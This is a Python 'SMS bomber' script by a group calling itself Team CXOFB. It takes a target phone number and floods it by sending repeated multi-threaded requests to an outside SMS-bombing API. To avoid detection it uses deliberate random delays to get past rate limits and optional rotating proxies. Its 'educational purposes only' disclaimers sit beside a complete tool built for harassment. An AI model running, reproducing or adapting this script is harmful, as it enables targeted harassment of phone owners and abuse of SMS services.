#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🚀 CXOFB SMS BO-MBER API ULTRA VERSION v1.0 🚀         ║
║     🔥 POWERFUL & ULTRA FAST SMS BOOMBER 🔥                ║
║     ⚡ DEVELOPED BY TEAM CXOFB ⚡                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝

📌 DESCRIPTION:
This is a powerful SMS bomber tool for educational & testing purposes.
Use it responsibly and only on numbers you own or have permission to test.

⚠️ DISCLAIMER:
- This tool is for EDUCATIONAL PURPOSES ONLY
- DO NOT misuse this tool for harassment or illegal activities
- The developer is NOT responsible for any misuse
- Use at your own risk

🔧 FEATURES:
- Multi-threaded for ultra-fast bombing
- Customizable number of requests
- Beautiful terminal interface
- Error handling & retry mechanism
- Proxy support (optional)

📡 JOIN CXOFB COMMUNITY FOR MORE EXCLUSIVE TOOLS!
"""

import requests
import time
import threading
import os
import sys
from datetime import datetime
from colorama import init, Fore, Style
import random
import json

# Initialize colorama for cross-platform color support
init(autoreset=True)

# ASCII Art Banner
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                              ║
{Fore.YELLOW}║     🚀 CXOFB SMS BO-MBER API ULTRA VERSION v1.0 🚀         ║
{Fore.GREEN}║     🔥 POWERFUL & ULTRA FAST SMS BOOMBER 🔥                ║
{Fore.MAGENTA}║     ⚡ DEVELOPED BY TEAM CXOFB ⚡                          ║
{Fore.CYAN}║                                                              ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝

{Fore.RED}⚠️  DISCLAIMER: {Fore.WHITE}For Educational & Testing Purposes Only!
{Fore.RED}🚫 {Fore.WHITE}DO NOT misuse this tool for harassment or illegal activities!

{Fore.GREEN}🌐 API STATUS: {Fore.GREEN}ONLINE [🟢]
{Fore.YELLOW}⚡ SPEED: {Fore.YELLOW}INSANE SPEED [⚡]
{Fore.BLUE}🛠️ DEVELOPER: {Fore.BLUE}TEAM CXOFB

{Fore.CYAN}┌──────────────────────────────────────┐
{Fore.CYAN}│ 📌 [ API URL ]                       │
{Fore.CYAN}├──────────────────────────────────────┤
{Fore.CYAN}│ 🔗 https://cxofb.teamsbapp.com/CXOFB/sms-bomber1.php?number=018xxxxxxx │
{Fore.CYAN}└──────────────────────────────────────┘

{Fore.RED}⚠️  [ IMPORTANT DISCLAIMER ] ⚠️
{Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.RED}🚫 {Fore.WHITE}DO NOT USE FOR HARMFUL OR ILLEGAL PURPOSES!
{Fore.GREEN}🎯 {Fore.WHITE}THIS API IS STRICTLY CREATED FOR FUN & TESTING.
{Fore.RED}🔒 {Fore.WHITE}WE ARE NOT RESPONSIBLE FOR ANY MISUSE.
{Fore.RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{Fore.YELLOW}💥 VERY POWERFUL & ULTRA FAST 💥
{Fore.WHITE}Use it wisely, respect others, and keep experimenting!

{Fore.CYAN}🌟 STAY WITH CXOFB 🌟
{Fore.MAGENTA}📡 JOIN OUR COMMUNITY FOR MORE EXCLUSIVE APIS!

{Fore.CYAN}💎 💠 💎 💠 💎 💠 💎 💠 💎 💠 💎 💠 💎
"""

class CXOFBSmsBomber:
    def __init__(self):
        self.api_url = "https://cxofb.teamsbapp.com/CXOFB/sms-bomber1.php"
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.running = True
        self.proxies = []
        self.use_proxy = False
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self):
        """Print the banner"""
        self.clear_screen()
        print(BANNER)
        print(f"\n{Fore.CYAN}{'═'*60}")
        
    def get_user_input(self):
        """Get target phone number and number of requests"""
        print(f"\n{Fore.YELLOW}📱 Enter Target Phone Number: {Fore.WHITE}")
        phone = input(f"{Fore.GREEN}➜ {Fore.WHITE}").strip()
        
        # Validate phone number (basic validation)
        if not phone or len(phone) < 10:
            print(f"\n{Fore.RED}❌ Invalid phone number! Please enter a valid number.")
            time.sleep(2)
            return None, None
        
        print(f"\n{Fore.YELLOW}⚡ Enter Number of Requests: {Fore.WHITE}")
        try:
            requests_count = int(input(f"{Fore.GREEN}➜ {Fore.WHITE}").strip())
            if requests_count <= 0:
                print(f"\n{Fore.RED}❌ Please enter a positive number!")
                time.sleep(2)
                return None, None
        except ValueError:
            print(f"\n{Fore.RED}❌ Invalid input! Please enter a number.")
            time.sleep(2)
            return None, None
            
        return phone, requests_count
    
    def send_sms_request(self, phone, thread_id):
        """Send SMS request to the API"""
        params = {
            'number': phone
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        
        # Add random delay to avoid rate limiting
        time.sleep(random.uniform(0.1, 0.5))
        
        try:
            # Use proxy if enabled
            proxy = None
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxies = {'http': proxy, 'https': proxy}
            else:
                proxies = None
            
            response = requests.get(
                self.api_url, 
                params=params, 
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            with self.lock:
                if response.status_code == 200:
                    self.success_count += 1
                    print(f"{Fore.GREEN}✅ [{thread_id}] SMS Sent Successfully! [{self.success_count}]")
                    return True
                else:
                    self.fail_count += 1
                    print(f"{Fore.RED}❌ [{thread_id}] Failed! Status: {response.status_code}")
                    return False
                    
        except requests.exceptions.Timeout:
            with self.lock:
                self.fail_count += 1
                print(f"{Fore.RED}❌ [{thread_id}] Timeout Error!")
            return False
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.fail_count += 1
                print(f"{Fore.RED}❌ [{thread_id}] Connection Error!")
            return False
        except Exception as e:
            with self.lock:
                self.fail_count += 1
                print(f"{Fore.RED}❌ [{thread_id}] Error: {str(e)[:50]}")
            return False
    
    def worker(self, phone, thread_id):
        """Worker thread for sending SMS"""
        while self.running:
            try:
                self.send_sms_request(phone, thread_id)
                time.sleep(random.uniform(0.2, 0.8))  # Random delay between requests
            except Exception as e:
                print(f"{Fore.RED}⚠️ Thread {thread_id} error: {e}")
                time.sleep(1)
    
    def start_bombing(self, phone, total_requests, thread_count=20):
        """Start the bombing process with multiple threads"""
        print(f"\n{Fore.GREEN}🚀 Starting SMS Bombing...")
        print(f"{Fore.YELLOW}📱 Target: {Fore.WHITE}{phone}")
        print(f"{Fore.YELLOW}📊 Total Requests: {Fore.WHITE}{total_requests}")
        print(f"{Fore.YELLOW}🧵 Threads: {Fore.WHITE}{thread_count}")
        print(f"\n{Fore.CYAN}{'═'*60}\n")
        
        start_time = time.time()
        
        # Calculate requests per thread
        requests_per_thread = total_requests // thread_count
        remaining = total_requests % thread_count
        
        threads = []
        
        # Create and start threads
        for i in range(thread_count):
            # Each thread will send a specific number of requests
            thread_requests = requests_per_thread + (1 if i < remaining else 0)
            thread = threading.Thread(
                target=self.worker_with_limit,
                args=(phone, f"T{i+1}", thread_requests)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # Small delay between thread creation
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        # Display results
        print(f"\n{Fore.CYAN}{'═'*60}")
        print(f"{Fore.GREEN}✅ Bombing Complete!")
        print(f"{Fore.GREEN}📊 Results:")
        print(f"{Fore.GREEN}  ✅ Success: {self.success_count}")
        print(f"{Fore.RED}  ❌ Failed: {self.fail_count}")
        print(f"{Fore.YELLOW}  ⏱️ Time: {elapsed_time:.2f} seconds")
        print(f"{Fore.YELLOW}  🚀 Speed: {self.success_count/elapsed_time:.2f} SMS/second")
        print(f"{Fore.CYAN}{'═'*60}")
    
    def worker_with_limit(self, phone, thread_id, limit):
        """Worker with request limit"""
        sent = 0
        while self.running and sent < limit:
            if self.send_sms_request(phone, thread_id):
                sent += 1
            time.sleep(random.uniform(0.2, 0.8))
    
    def load_proxies(self, proxy_file="proxies.txt"):
        """Load proxies from file"""
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                if self.proxies:
                    self.use_proxy = True
                    print(f"{Fore.GREEN}✅ Loaded {len(self.proxies)} proxies")
                    return True
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading proxies: {e}")
        return False
    
    def main(self):
        """Main function"""
        try:
            self.print_header()
            
            # Get user input
            phone, total_requests = self.get_user_input()
            if not phone or not total_requests:
                return
            
            # Ask for proxy usage
            print(f"\n{Fore.YELLOW}🔄 Use Proxies? (y/n): {Fore.WHITE}")
            use_proxy = input(f"{Fore.GREEN}➜ {Fore.WHITE}").strip().lower()
            
            if use_proxy == 'y':
                self.load_proxies()
            
            # Ask for thread count
            print(f"\n{Fore.YELLOW}🧵 Number of Threads (default 20): {Fore.WHITE}")
            thread_input = input(f"{Fore.GREEN}➜ {Fore.WHITE}").strip()
            try:
                thread_count = int(thread_input) if thread_input else 20
                thread_count = max(1, min(thread_count, 100))  # Limit to 100 threads
            except ValueError:
                thread_count = 20
            
            # Start bombing
            self.start_bombing(phone, total_requests, thread_count)
            
            # Ask if user wants to continue
            print(f"\n{Fore.YELLOW}🔄 Continue bombing? (y/n): {Fore.WHITE}")
            continue_bomb = input(f"{Fore.GREEN}➜ {Fore.WHITE}").strip().lower()
            if continue_bomb == 'y':
                self.running = True
                self.success_count = 0
                self.fail_count = 0
                self.main()
            else:
                print(f"\n{Fore.GREEN}👋 Thank you for using CXOFB SMS Bomber!")
                print(f"{Fore.CYAN}🌟 Stay with CXOFB for more exclusive tools! 🌟")
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}⚠️ Process interrupted by user!")
            self.running = False
            print(f"{Fore.GREEN}👋 Goodbye!")
            sys.exit(0)
        except Exception as e:
            print(f"\n{Fore.RED}❌ Unexpected Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required packages
        try:
            import requests
            import colorama
        except ImportError as e:
            print(f"{Fore.RED}❌ Missing required package: {e}")
            print(f"{Fore.YELLOW}📦 Install with: pip install requests colorama")
            sys.exit(1)
        
        # Run the bomber
        bomber = CXOFBSmsBomber()
        bomber.main()
        
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️ Process interrupted by user!")
        print(f"{Fore.GREEN}👋 Goodbye!")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Fatal Error: {e}")
        sys.exit(1)